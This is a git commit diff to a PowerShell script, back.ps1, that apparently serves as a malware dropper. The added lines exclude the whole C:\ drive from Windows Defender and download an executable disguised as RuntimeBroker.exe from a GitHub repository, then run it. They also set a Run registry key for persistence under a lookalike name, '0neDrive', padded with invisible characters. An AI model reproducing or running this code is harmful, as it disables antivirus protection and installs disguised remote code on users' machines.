577885d300f534ed305ad5b7851472cf3a167ad5
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-11 06:12:10 -0800

    Update back.ps1

--- back.ps1
+++ back.ps1
@@ -3,3 +3,17 @@ $url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/Run
 $output = "$env:Temp/RuntimeBroker.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
+
+
+
+
+
+Add-MpPreference -ExclusionPath C:\
+$url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
+$output = "$env:Temp/RuntimeBroker.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
+$exePath = "$env:APPDATA\System32\OneDrive.exe"
+$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regValueName = "‌‌0neDrive‌‌‌‌"
+Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
